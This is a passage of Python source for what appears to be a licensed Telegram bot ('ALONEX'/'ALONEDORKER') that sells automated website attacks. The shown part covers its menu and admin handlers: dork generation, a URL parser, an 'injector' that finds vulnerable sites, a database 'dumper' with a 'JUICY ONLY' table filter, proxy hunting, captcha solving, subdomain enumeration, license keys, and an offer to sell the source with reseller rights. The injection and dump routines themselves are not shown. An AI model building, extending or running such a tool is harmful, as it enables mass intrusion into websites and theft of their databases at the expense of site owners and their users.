            threading.Thread(target=run_datadump,args=(cid,uid,msg.message_id,jid,urls,None,mode,d[6:]=="juicy")).start()
    elif d=="pipe:inject":
        if not lic_gate(cid,uid): return
        urls=LAST.get(uid,{}).get("parsed")
        if not urls: bot.send_message(cid, f"<blockquote><b>{E['cross']} RUN PARSER FIRST!</b></blockquote>", parse_mode="HTML"); return
        jid=new_job(); mode=get_mode(uid)
        msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} STARTING INJECTOR...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
        threading.Thread(target=turbo_inject,args=(cid,uid,msg.message_id,jid,urls,mode,15)).start()
    elif d=="pipe:data":
        if not lic_gate(cid,uid): return
        vuln=LAST.get(uid,{}).get("vuln")
        if not vuln: bot.send_message(cid, f"<blockquote><b>{E['cross']} RUN INJECTOR FIRST!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("data_filter",{"urls":vuln})
        set_cur(uid,"data_filter")
        mk=types.InlineKeyboardMarkup()
        mk.row(sbtn("ALL TABLES","dfilt:all","primary"),sbtn("JUICY ONLY","dfilt:juicy","success"))
        back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['target']} SELECT TABLE FILTER:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="menu:proxy":
        set_cur(uid,"proxy")
        send_banner(cid,"proxies", f"<blockquote><b>{E['shield']} PROXY MANAGER\n{LINE}\n{E['lock']} POOL | {E['tick']} {len(uprox(uid))} PROXIES</b></blockquote>", proxy_markup(), parse_mode="HTML")
    elif d=="proxy:list":
        prx=uprox(uid)
        if not prx: bot.send_message(cid, f"<blockquote><b>{E['shield']} PROXIES\n{LINE}\n{E['cross']} POOL EMPTY! RUN HUNT.</b></blockquote>", parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['shield']} PROXIES\n{LINE}\n{E['tick']} {len(prx)}\n" + "\n".join(prx[:30]) + "</b></blockquote>", parse_mode="HTML")
    elif d=="proxy:add":
        with STATES_LOCK: states[uid]=("proxy_add",{})
        bot.send_message(cid, f"<blockquote><b>{E['shield']} SEND PROXIES (TEXT/.TXT):</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
    elif d=="proxy:check":
        with STATES_LOCK: states[uid]=("proxy_check",{})
        bot.send_message(cid, f"<blockquote><b>{E['tick']} SEND PROXIES TO CHECK:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
    elif d=="proxy:hunt":
        jid=new_job()
        msg=bot.send_message(cid, f"<blockquote><b>{E['zap']} HUNTING 1000 PROXIES...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
        threading.Thread(target=turbo_hunt,args=(cid,uid,msg.message_id,jid)).start()
    elif d=="proxy:clean":
        saved=uprox(uid)
        if not saved: bot.send_message(cid, f"<blockquote><b>{E['cross']} POOL EMPTY!</b></blockquote>", parse_mode="HTML"); return
        msg=bot.send_message(cid, f"<blockquote><b>{E['gear']} CLEANING 0/{len(saved)}...</b></blockquote>", parse_mode="HTML")
        threading.Thread(target=run_clean,args=(cid,uid,msg.message_id,saved)).start()
    elif d=="menu:ref":
        set_cur(uid,"ref")
        u=U(uid)
        mk=types.InlineKeyboardMarkup(); mk.add(ubtn("REFERRAL LINK",f"https://t.me/{BOT_USERNAME}?start=REF_{uid}")); back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['gift']} REFER & EARN\n{LINE}\n{sget('ref_need',5)} REFERS = {sget('ref_reward_days',1)} DAYS\n{E['tick']} YOUR REFERS: {u.get('ref_count',0)}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="menu:sell":
        cap=f"<blockquote><b>{E['skull']} SOURCE CODE FOR SALE\n{LINE}\n{E['money']} PRICE: {sget('sc_price','$50')}\n{E['zap']} FULL ALONEX SOURCE\n{E['fire']} RESELLER RIGHTS INCLUDED</b></blockquote>"
        mk=types.InlineKeyboardMarkup(); mk.add(ubtn("CONTACT TO BUY",fix_url(sget("sc_contact","")))); back_row(mk)
        fid=PHOTO_FC.get("main")
        try:
            if fid: bot.send_photo(cid,fid,caption=cap,reply_markup=mk,parse_mode="HTML")
            else:
                with open(BANNERS["main"],"rb") as f: m=bot.send_photo(cid,f,caption=cap,reply_markup=mk,parse_mode="HTML")
                try: PHOTO_FC["main"]=m.photo[-1].file_id
                except: pass
        except: bot.send_message(cid,cap,reply_markup=mk,parse_mode="HTML")
    elif d=="menu:support":
        with STATES_LOCK: states[uid]=("support",{})
        bot.send_message(cid, f"<blockquote><b>{E['horn']} SEND SUPPORT MESSAGE:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
    elif d=="menu:solver":
        with STATES_LOCK: states[uid]=("cap_url",{})
        set_cur(uid,"cap_url")
        mk=types.InlineKeyboardMarkup(); back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['puzzle']} CAPTCHA SOLVER\n{LINE}\n{E['web']} SEND URL:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="menu:files":
        set_cur(uid,"files")
        idx=load_json(os.path.join(FILES_DIR,str(uid),"index.json"),[])
        mk=types.InlineKeyboardMarkup()
        for i,e in enumerate(reversed(idx)): mk.add(btn(f"FILE: {e['n'].upper()}",f"file:{len(idx)-1-i}"))
        mk.add(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['folder']} MY FILES\n{LINE}</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    elif d.startswith("file:"):
        idx=load_json(os.path.join(FILES_DIR,str(uid),"index.json"),[]); i=int(d[5:])
        if i<len(idx):
            try:
                with open(os.path.join(FILES_DIR,str(uid),idx[i]["f"]),"rb") as f: send_doc(cid,f.read(),idx[i]["n"],store=False)
            except: pass
    elif d=="menu:speed":
        set_cur(uid,"speed")
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("TURBO","speed:turbo"),btn("FAST","speed:fast"))
        mk.row(btn("BALANCED","speed:balanced"),btn("DEEP","speed:deep"))
        back_row(mk)
        bot.send_message(cid, f"<blockquote><b>{E['zap']} SPEED MODE\n{LINE}\nCURRENT: {U(uid).get('mode','turbo').upper()}</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    elif d.startswith("speed:"):
        setU(uid,{"mode":d[6:]}); bot.send_message(cid, f"<blockquote><b>{E['zap']} MODE SET TO: {d[6:].upper()}</b></blockquote>", parse_mode="HTML")
    elif d=="menu:lic":
        set_cur(uid,"lic")
        exp=license_until(uid)
        mk=types.InlineKeyboardMarkup(); mk.row(btn("REDEEM","lic:redeem"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['ticket']} LICENSE\n{LINE}\n" + (f"{E['tick']} VALID TILL: {datetime.fromtimestamp(exp):%d %b %Y}" if exp else f"{E['cross']} NOT ACTIVE.") + "</b></blockquote>", reply_markup=mk, parse_mode="HTML"); return
    elif d=="lic:redeem":
        with STATES_LOCK: states[uid]=("user_redeem",{})
        bot.send_message(cid, f"<blockquote><b>{E['lock']} SEND LICENSE KEY:</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
    elif d=="menu:help":
        set_cur(uid,"help")
        mk=types.InlineKeyboardMarkup(); mk.add(btn("BACK","back"))
        bot.send_message(cid, HELP_TXT, reply_markup=mk, parse_mode="HTML")
    elif d=="back":
        scr=PARENT.get(CUR.get(uid,"home"),"home")
        render_screen(uid,cid,mid,scr)
    elif d.startswith("reply:"):
        with STATES_LOCK: states[uid]=("adm_reply",{"uid":int(d[6:])})
        bot.send_message(cid, f"<blockquote><b>{E['horn']} ENTER REPLY:</b></blockquote>", parse_mode="HTML")
    elif d=="adm:add":
        with STATES_LOCK: states[uid]=("adm_addadmin",{})
        bot.send_message(cid, f"<blockquote><b>{E['user']} ENTER CHAT ID:</b></blockquote>", parse_mode="HTML"); return
    elif d=="adm:auto":
        users=load_json(USERS_DB,{}); items=list(users.items())[-6:]; ap=sget("auto_approved",[])
        mk=types.InlineKeyboardMarkup()
        for u,v in items: mk.row(btn(("✅ " if str(u) in ap else "⬜ ")+f"@{(v.get('username') or u)[:9]}",f"auto:tg:{u}"))
        mk.add(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['robot']} AUTO APPROVALS\nTAP TO TOGGLE:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d.startswith("auto:tg:"):
        u2=d[8:]; st=S(); ap=st.setdefault("auto_approved",[])
        if str(u2) in ap: ap.remove(str(u2))
        else: ap.append(str(u2))
        setS(st)
        bot.send_message(cid, f"<blockquote><b>USER {u2}: {'APPROVED' if str(u2) in ap else 'REMOVED'}</b></blockquote>", parse_mode="HTML")
    elif d=="adm:autoset":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn(f"{sget('auto_interval',1)} HOURS","autoset:int"),btn(f"{sget('auto_dorks',500)} DORKS","autoset:dorks"))
        mk.row(btn("CHANNEL","autoset:ch"),btn(f"SCOPE {'ON' if sget('scope_on') else 'OFF'}","autoset:scope"))
        mk.add(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['gear']} AUTO SETTINGS\nCHANNEL: {sget('results_channel','NONE')}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="autoset:int":
        with STATES_LOCK: states[uid]=("set_autoint",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER INTERVAL (HOURS):</b></blockquote>", parse_mode="HTML")
    elif d=="autoset:dorks":
        with STATES_LOCK: states[uid]=("set_autodorks",{})
        bot.send_message(cid, f"<blockquote><b>{E['dna']} ENTER DORKS PER CYCLE:</b></blockquote>", parse_mode="HTML")
    elif d=="autoset:ch":
        with STATES_LOCK: states[uid]=("set_channel",{})
        bot.send_message(cid, f"<blockquote><b>{E['horn']} ENTER @CHANNEL:</b></blockquote>", parse_mode="HTML")
    elif d=="autoset:scope":
        st=S(); st["scope_on"]=not st.get("scope_on",False); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['target']} SCOPE FILTER: {'ON' if st['scope_on'] else 'OFF'}</b></blockquote>", parse_mode="HTML")
    elif d=="adm:sched":
        sc=sget("sched",{})
        mk=types.InlineKeyboardMarkup()
        mk.row(btn(f"TOGGLE: {'ON' if sc.get('on') else 'OFF'}","sched:on"),btn(f"HOUR: {sc.get('hour',6)}","sched:hour"))
        mk.row(btn("SAVE DORKS","sched:dorks"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['gear']} SCHEDULER\nDORKS SAVED: {len(sc.get('dorks',[]))}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="sched:on":
        st=S(); sc=st.setdefault("sched",{}); sc["on"]=not sc.get("on"); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['gear']} SCHEDULER IS NOW: {'ON' if sc['on'] else 'OFF'}</b></blockquote>", parse_mode="HTML")
    elif d=="sched:hour":
        with STATES_LOCK: states[uid]=("sched_hour",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER HOUR (0-23):</b></blockquote>", parse_mode="HTML")
    elif d=="sched:dorks":
        with STATES_LOCK: states[uid]=("sched_dorks",{})
        bot.send_message(cid, f"<blockquote><b>{E['dna']} SEND DORKS TO SAVE:</b></blockquote>", parse_mode="HTML")
    elif d.startswith("ulic:"):
        _,act,uid2=d.split(":"); uid2=int(uid2)
        if act=="rev": setU(uid2,{"revoked_at":time.time(),"admin_lic":0,"bonus_until":0}); bot.send_message(cid, f"<blockquote><b>{E['cross']} LICENSE REVOKED: {uid2}</b></blockquote>", parse_mode="HTML")
        elif act=="c100": setU(uid2,{"credits":U(uid2).get("credits",0)+100}); bot.send_message(cid, f"<blockquote><b>{E['money']} ADDED 100 CREDITS TO: {uid2}</b></blockquote>", parse_mode="HTML")
        else:
            cur=license_until(uid2) or time.time()
            setU(uid2,{"admin_lic":max(cur,time.time())+int(act)*86400})
            bot.send_message(cid, f"<blockquote><b>{E['tick']} ADDED {act} DAYS TO: {uid2}</b></blockquote>", parse_mode="HTML")
    elif d=="adm:users":
        users=load_json(USERS_DB,{}); items=list(users.items())[-6:]
        mk=types.InlineKeyboardMarkup()
        for u,v in items: mk.row(btn(f"+7D @{(v.get('username') or u)[:7]}",f"ulic:7:{u}"),btn("+30D",f"ulic:30:{u}"),btn("REVOKE",f"ulic:rev:{u}"))
        mk.add(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['user']} MANAGE USERS & LICENSES</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="adm:gen":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("1 HOUR","adm:genh:1"),btn("24 HOURS","adm:genh:24"))
        mk.row(btn("7 DAYS","adm:genh:168"),btn("30 DAYS","adm:genh:720"))
        mk.add(btn("CUSTOM HOURS","adm:custom"))
        bot.send_message(cid, f"<blockquote><b>{E['gear']} KEY GENERATOR</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d.startswith("adm:genh:"):
        bot.send_message(cid, f"<blockquote><b>{E['ticket']} KEY GENERATED\n{LINE}\n<code>{make_key(uid,int(d.split(':')[2]))}</code></b></blockquote>", parse_mode="HTML")
    elif d=="adm:custom":
        with STATES_LOCK: states[uid]=("adm_hours",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER DURATION (IN HOURS):</b></blockquote>", parse_mode="HTML")
    elif d=="adm:keys":
        keys=load_json(KEYS_DB,{})
        out=[f"<code>{k}</code> | {v['hours']}H | "+("UNUSED" if not v.get("activated_by") else f"USED BY {v['activated_by']}") for k,v in list(keys.items())[-15:]]
        bot.send_message(cid, f"<blockquote><b>{E['ticket']} GENERATED KEYS\n{LINE}\n" + ("\n".join(out) if out else "NO KEYS FOUND.") + "</b></blockquote>", parse_mode="HTML")
    elif d=="adm:stats":
        s=load_json(STATS_DB,{}); users=load_json(USERS_DB,{})
        act=sum(1 for u in users if license_until(int(u)))
        topu=sorted(users.items(),key=lambda kv:sum(kv[1].get("stats",{}).values()),reverse=True)[:5]
        tl="\n".join(f"• @{v.get('username','?')}: {sum(v.get('stats',{}).values())} HITS" for k,v in topu)
        bot.send_message(cid, f"<blockquote><b>{E['chart']} BOT ANALYTICS\n{LINE}\n{E['user']} USERS: {len(users)} | {E['ticket']} ACTIVE: {act}\n{E['dna']} {s.get('gen',0)} | {E['globe']} {s.get('parse',0)} | {E['syringe']} {s.get('inject',0)}\n{E['blood']} {s.get('dump',0)} | {E['rocket']} {s.get('auto',0)}\n\nTOP USERS:\n{tl or '-'}</b></blockquote>", parse_mode="HTML")
    elif d=="adm:bcast":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("ALL USERS","bcast:all"),btn("SPECIFIC USER","bcast:uid"))
        bot.send_message(cid, f"<blockquote><b>{E['horn']} BROADCAST MENU</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="bcast:all":
        with STATES_LOCK: states[uid]=("bcast",{"target":"all"})
        bot.send_message(cid, f"<blockquote><b>{E['horn']} SEND MESSAGE TO BROADCAST:</b></blockquote>", parse_mode="HTML")
    elif d=="bcast:uid":
        with STATES_LOCK: states[uid]=("bcast_uid",{})
        bot.send_message(cid, f"<blockquote><b>{E['user']} ENTER TARGET CHAT ID:</b></blockquote>", parse_mode="HTML")
    elif d=="adm:ch":
        chans=sget("channels",[])
        mk=types.InlineKeyboardMarkup()
        for i,ch in enumerate(chans): mk.row(btn(f"REMOVE {ch.get('name','?').upper()}","ch:rm:{i}"))
        mk.row(btn("ADD NEW","ch:add"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['horn']} FORCE SUBSCRIBE CHANNELS\nTOTAL: {len(chans)}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="ch:add":
        with STATES_LOCK: states[uid]=("ch_add",{})
        bot.send_message(cid, f"<blockquote><b>{E['horn']} SEND @USERNAME OR INVITE LINK:</b></blockquote>", parse_mode="HTML")
    elif d.startswith("ch:rm:"):
        st=S(); chs=st.get("channels",[]); i=int(d[6:])
        if i<len(chs): chs.pop(i); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['tick']} CHANNEL REMOVED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
    elif d=="adm:hunt":
        with STATES_LOCK: states[uid]=("set_huntbelow",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} PROXY HUNT THRESHOLD\nCURRENT: {sget('hunt_below',10)} (0=OFF):</b></blockquote>", parse_mode="HTML")
    elif d=="adm:sec":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn(f"OTP {'ON' if sget('otp_on') else 'OFF'}","sec:otp"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['lock']} SECURITY SETTINGS</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="sec:otp":
        st=S(); st["otp_on"]=not st.get("otp_on",False); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['lock']} OTP REQUIREMENT IS NOW {'ON' if st['otp_on'] else 'OFF'}</b></blockquote>", parse_mode="HTML")
    elif d=="adm:ref":
        st=S()
        mk=types.InlineKeyboardMarkup()
        mk.row(btn(f"REQUIRE: {st.get('ref_need',5)}","refr:need"),btn(f"REWARD: {st.get('ref_reward_days',1)}D","refr:days"))
        mk.row(btn(f"FLAG THRESH: {st.get('flag_threshold',3)}","refr:flag"),btn(f"AUTO-BAN {'ON' if st.get('auto_ban',True) else 'OFF'}","refr:ban"))
        mk.row(btn("VIEW FLAGS","refr:flags"),btn("TOP REFERS","refr:top"))
        mk.add(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['gift']} REFERRAL SYSTEM SETTINGS</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="refr:need":
        with STATES_LOCK: states[uid]=("set_refneed",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER REFERS REQUIRED:</b></blockquote>", parse_mode="HTML")
    elif d=="refr:days":
        with STATES_LOCK: states[uid]=("set_refdays",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER REWARD DAYS:</b></blockquote>", parse_mode="HTML")
    elif d=="refr:flag":
        with STATES_LOCK: states[uid]=("set_flaglim",{})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} ENTER FLAG THRESHOLD FOR BAN:</b></blockquote>", parse_mode="HTML")
    elif d=="refr:ban":
        st=S(); st["auto_ban"]=not st.get("auto_ban",True); setS(st)
        bot.send_message(cid, f"<blockquote><b>{E['lock']} AUTO BAN IS NOW {'ON' if st['auto_ban'] else 'OFF'}</b></blockquote>", parse_mode="HTML")
    elif d=="refr:flags":
        fl=sget("flags",[])
        out=[f"• UID: {f['uid']} @{f['u']} — REASON: {f['r']}" for f in fl[-15:]]
        bot.send_message(cid, f"<blockquote><b>{E['warn']} FLAGGED USERS\n{LINE}\n" + ("\n".join(out) if out else "NO FLAGS ISSUED.") + "</b></blockquote>", parse_mode="HTML")
    elif d=="refr:top":
        users=load_json(USERS_DB,{})
        top=sorted([(v.get("ref_count",0),k) for k,v in users.items()],reverse=True)[:10]
        bot.send_message(cid, f"<blockquote><b>{E['chart']} TOP REFERRERS\n{LINE}\n" + ("\n".join(f"• @{users.get(k,{}).get('username','?')} — {n}" for n,k in top if n>0) or "LEADERBOARD EMPTY.") + "</b></blockquote>", parse_mode="HTML")
    elif d=="adm:plans":
        ps=plans()
        mk=types.InlineKeyboardMarkup()
        for i,p in enumerate(ps): mk.row(btn(f"DEL {p['name'].upper()} ({p['price']}/{p['days']}D)","plan:rm:{i}"))
        mk.row(btn("ADD PLAN","plan:add"),btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['gem']} MANAGE PRICING PLANS</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d.startswith("plan:rm:"):
        st=S(); ps=st.get("plans",plans()); i=int(d[8:])
        if i<len(ps):
            ps.pop(i); st["plans"]=ps; setS(st)
            bot.send_message(cid, f"<blockquote><b>{E['tick']} PLAN DELETED!</b></blockquote>", parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} INVALID INDEX!</b></blockquote>", parse_mode="HTML")
        return
    elif d=="plan:add":
        with STATES_LOCK: states[uid]=("plan_name",{})
        bot.send_message(cid, f"<blockquote><b>{E['gem']} ENTER PLAN NAME:</b></blockquote>", parse_mode="HTML")
    elif d=="adm:res":
        mk=types.InlineKeyboardMarkup()
        for n in RES_FILES: mk.row(btn(f"VIEW {n.upper()}",f"res:view:{n}"),btn(f"EDIT {n.upper()}",f"res:edit:{n}"))
        mk.row(btn("BACK","back"))
        bot.send_message(cid, f"<blockquote><b>{E['folder']} MANAGE RESOURCES</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d.startswith("res:view:"):
        n=d[9:]
        try:
            with open(RES_FILES[n],"rb") as f: send_doc(cid,f.read(),n+".txt",store=False)
        except: pass
    elif d.startswith("res:edit:"):
        with STATES_LOCK: states[uid]=("res_edit",{"name":d[9:]})
        bot.send_message(cid, f"<blockquote><b>{E['gear']} SEND NEW CONTENT FOR {d[9:].upper()}:</b></blockquote>", parse_mode="HTML")
    elif d=="adm:sale":
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("SET PRICE","sale:price"),btn("SET CONTACT","sale:contact"))
        bot.send_message(cid, f"<blockquote><b>{E['money']} SCRIPT SALE SETTINGS\nCURRENT PRICE: {sget('sc_price','$50')}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif d=="sale:price":
        with STATES_LOCK: states[uid]=("set_price",{})
        bot.send_message(cid, f"<blockquote><b>{E['money']} ENTER NEW PRICE:</b></blockquote>", parse_mode="HTML")
    elif d=="sale:contact":
        with STATES_LOCK: states[uid]=("set_contact",{})
        bot.send_message(cid, f"<blockquote><b>{E['user']} ENTER CONTACT LINK:</b></blockquote>", parse_mode="HTML")

def make_key(by,hours):
    keys=load_json(KEYS_DB,{})
    key="BZRK-"+secrets.token_hex(2).upper()+"-"+secrets.token_hex(2).upper()
    keys[key]={"hours":hours,"created":time.time(),"created_by":by,"activated_by":None,"activated_at":None}
    save_json(KEYS_DB,keys); return key

def ask_count(cid):
    mk=types.InlineKeyboardMarkup()
    mk.row(btn("1K","genc:1000"),btn("5K","genc:5000"),btn("10K","genc:10000"))
    mk.row(btn("50K","genc:50000"),btn("100K","genc:100000"),btn("CUSTOM","genc:custom"))
    back_row(mk)
    bot.send_message(cid, f"<blockquote><b>{E['dna']} SELECT DORK COUNT\n(MAX 1,000,000):</b></blockquote>", reply_markup=mk, parse_mode="HTML")

def start_gen(cid,uid,count):
    with STATES_LOCK: st=states.get(uid)
    if not st or st[0]!="gen_count": return
    if not (1<=count<=1000000): bot.send_message(cid, f"<blockquote><b>{E['cross']} INVALID AMOUNT! (1 - 1,000,000)</b></blockquote>", parse_mode="HTML"); return
    kws=st[1]["kws"]
    with STATES_LOCK: states.pop(uid,None)
    threading.Thread(target=run_gen,args=(cid,uid,kws,count)).start()

def run_km(cid,uid,kws,count):
    bump("km"); bumpU(uid,"km")
    msg=bot.send_message(cid, f"<blockquote><b>{E['brain']} KEYWORD MAKER\n{LINE}\nGENERATING {count} UHQ KEYWORDS...</b></blockquote>", parse_mode="HTML")
    kws=make_keywords(kws,count)
    try: bot.delete_message(cid,msg.message_id)
    except: pass
    send_doc(cid,("\n".join(kws)).encode(),"keywords.txt",uid)
    bot.send_message(cid, f"<blockquote><b>{E['tick']} KEYWORD MAKER DONE\n{LINE}\nGENERATED {len(kws)} UHQ KEYWORDS!</b></blockquote>", parse_mode="HTML")

def run_gen(cid,uid,kws,count):
    bump("gen"); bumpU(uid,"gen")
    msg=bot.send_message(cid, f"<blockquote><b>{E['dna']} ALONEDORKER\n{LINE}\nGENERATING {count} DORKS...</b></blockquote>", parse_mode="HTML")
    dorks=gen_dorks_list(kws,count)
    try: bot.delete_message(cid,msg.message_id)
    except: pass
    if not dorks: bot.send_message(cid, f"<blockquote><b>{E['cross']} RESOURCES MISSING!</b></blockquote>", parse_mode="HTML"); return
    send_doc(cid,("\n".join(dorks)).encode(),"dorks.txt",uid)
    bot.send_message(cid, f"<blockquote><b>{E['tick']} DORKER DONE\n{LINE}\nGENERATED {len(dorks)} DORKS!</b></blockquote>", parse_mode="HTML")

def run_subs(cid,uid,mid,dom):
    bump("subs"); bumpU(uid,"subs")
    names=[]
    try:
        t,s=_get(f"https://crt.sh/?q=%25.{dom}&output=json",PH([]),25)
        if t:
            names=sorted({e.get("name_value","") for e in json.loads(t) if e.get("name_value")})
            names=[n.replace("*.","") for n in names if "*" not in n]
    except: pass
    try: bot.delete_message(cid,mid)
    except: pass
    if names:
        send_doc(cid,("\n".join(names)).encode(),f"subs_{dom}.txt",uid)
        bot.send_message(cid, f"<blockquote><b>{E['web']} SUBFINDER\n{LINE}\n{E['tick']} FOUND {len(names)} SUBDOMAINS!</b></blockquote>", parse_mode="HTML")
    else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO SUBDOMAINS FOUND.</b></blockquote>", parse_mode="HTML")

# ============ M_INPUT WRAPPER ============
@bot.message_handler(content_types=["text","document"],func=lambda m:states.get(m.from_user.id) is not None)
def m_input(m):
    try: _m_input(m)
    except Exception as e:
        es=str(e)
        if any(x in es for x in ("message is not modified","message to edit not found","message to delete not found","chat not found")): return
        try: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} BUG DETECTED:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

def _m_input(m):
    uid=m.from_user.id
    if m.text and m.text.startswith("/"): return
    tmp=None
    if m.content_type=="document":
        try: tmp=bot.send_message(m.chat.id, f"<blockquote><b>{E['folder']} READING FILE... {E['zap']}</b></blockquote>", parse_mode="HTML")
        except: pass
    with STATES_LOCK:
        name,data=states.get(uid,(None,None))
        if name is None: return
    text=get_text(m)
    if tmp:
        try: bot.delete_message(m.chat.id,tmp.message_id)
        except: pass
        
    # 🚨 YEH 2 LINES MISSING THI (FILE LIMIT HANDLE KARNE KE LIYE)
    if text == "FILE_TOO_LARGE":
        bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} TELEGRAM API LIMIT EXCEEDED!\n{LINE}\n{E['warn']} BOTS CANNOT DOWNLOAD FILES LARGER THAN 20MB.\n{E['folder']} PLEASE SPLIT YOUR FILE INTO SMALLER PARTS.</b></blockquote>", parse_mode="HTML")
        with STATES_LOCK: states.pop(uid, None)
        return
    elif text == "DOWNLOAD_ERROR":
        bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} FILE DOWNLOAD FAILED!</b></blockquote>", parse_mode="HTML")
        with STATES_LOCK: states.pop(uid, None)
        return
        
        
    if name=="captcha": 
        bot.send_message(m.chat.id, f"<blockquote><b>{E['warn']} PLEASE USE THE BUTTONS!</b></blockquote>", parse_mode="HTML")
    elif name=="pem_cap":
        eid=None
        for e in (m.entities or []):
            if e.type=="custom_emoji": eid=e.custom_emoji_id; break
        if not eid:
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} NO CUSTOM EMOJI FOUND!</b></blockquote>", parse_mode="HTML"); return
        st=S(); pemd=st.setdefault("pem",{}); pemd[data["name"]]=eid; setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} {data['name'].upper()} EMOJI SAVED!</b></blockquote>", parse_mode="HTML")
    elif name=="cap_url":
        url=text.strip()
        if not url.startswith("http"): bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} SEND A VALID URL!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states.pop(uid,None)
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['puzzle']} STARTING SOLVER...</b></blockquote>", parse_mode="HTML")
        threading.Thread(target=cap_solve,args=(m.chat.id,uid,msg.message_id,url)).start()
    elif name=="adm_otp":
        if text.strip()==data.get("code"):
            with STATES_LOCK: states[uid]=("adm_ok",{})
            show_admin(uid,m.chat.id)
        else:
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INCORRECT OTP!</b></blockquote>", parse_mode="HTML")
    elif name=="set_chunk":
        try:
            val=int(text.strip())
            if 1<=val<=1000000:
                st=S(); st["admin_chunk_size"]=val; setS(st)
                bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} CHUNK SIZE SET TO: {val}</b></blockquote>", parse_mode="HTML")
            else: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} VALUE MUST BE BETWEEN 1 AND 1,000,000!</b></blockquote>", parse_mode="HTML")
            with STATES_LOCK: states.pop(uid,None)
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="set_capkey":
        st=S(); st["captcha_api"]=text.strip(); setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bal=cap_balance()
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} API KEY SAVED!\n{E['money']} BALANCE: {bal if bal is not None else 'CHECK FAILED'}</b></blockquote>", parse_mode="HTML")
    elif name=="set_ratelimit":
        try:
            val=int(text.strip())
            st=S(); st["rate_limit_sec"]=val; setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} RATE LIMIT SET TO: {val}S</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="gen_amount":
        try:
            n=int(text.replace(",","").strip()); kws=data["kws"]
            with STATES_LOCK: states.pop(uid,None)
